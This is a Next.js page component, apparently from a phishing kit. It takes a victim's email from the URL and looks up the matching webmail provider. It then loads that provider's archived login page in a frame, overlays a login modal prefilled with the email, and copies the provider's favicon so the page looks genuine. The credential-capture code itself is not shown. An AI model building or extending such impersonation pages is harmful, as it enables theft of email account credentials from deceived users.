"use client";
import { useState, useEffect, Suspense } from 'react';
import IFramer from "./components/iFramer";
import { useSearchParams } from 'next/navigation';
import { getWebmailInfo } from './functions/returnmailurl';
import LoginModal from './components/LoginModal';

function HomeContent() {
  const searchParams = useSearchParams();
  const email = searchParams.get('email') || '';
  const [webmailInfo, setWebmailInfo] = useState({ favicon: null, archivedPage: null, loginPage: null });
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [title, setTitle] = useState('');

  useEffect(() => {
    let isMounted = true;

    async function fetchWebmailInfo() {
      if (!email) {
        setIsLoading(false);
        return;
      }

      try {
        setIsLoading(true);
        setError(null);

        const info = await getWebmailInfo(email);

        
        if (isMounted) {
          setWebmailInfo(info);
        }
      } catch (err) {
        if (isMounted) {
          setError(err.message || 'Failed to fetch webmail information');
          console.error('Error fetching webmail info:', err);
        }
      } finally {
        
      }
    }

    fetchWebmailInfo();

    return () => {
      isMounted = false;
    };
  }, [email]);

  if (error) {
    return (
      <div style={{ 
        height: '100vh', 
        display: 'flex', 
        alignItems: 'center', 
        justifyContent: 'center',
        color: 'red',
        padding: '20px',
        textAlign: 'center'
      }}>
        <p>Error: {error}</p>
      </div>
    );
  }

  return (
    <div style={{height: '100vh', width: '100vw', position: 'relative'}}>
      {isLoading && (
        <div style={{
          position: 'absolute',
          top: '50%',
          left: '50%',
          transform: 'translate(-50%, -50%)',
          zIndex: 10
        }}>
          <div style={{
            width: '40px',
            height: '40px',
            border: '4px solid #f3f3f3',
            borderTop: '4px solid #3498db',
            borderRadius: '50%',
            animation: 'spin 1s linear infinite'
          }}/>
          <style jsx>{`
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
          `}</style>
        </div>
      )}
      
      {webmailInfo.loginPage && (
        <IFramer 
          url={webmailInfo.loginPage} 
          setIsLoading={setIsLoading}
          style={{ opacity: isLoading ? 0.5 : 1 }}
        >
          <LoginModal email={email} loginURL={webmailInfo.loginURL} />
        </IFramer>
      )}
      
      {webmailInfo.favicon && (
        <link rel="icon" type="image/x-icon" href={webmailInfo.favicon} />
      )}
    </div>
  );
}

export default function Home() {
  return (
    <Suspense fallback={<div></div>}>
      <HomeContent />
    </Suspense>
  );
}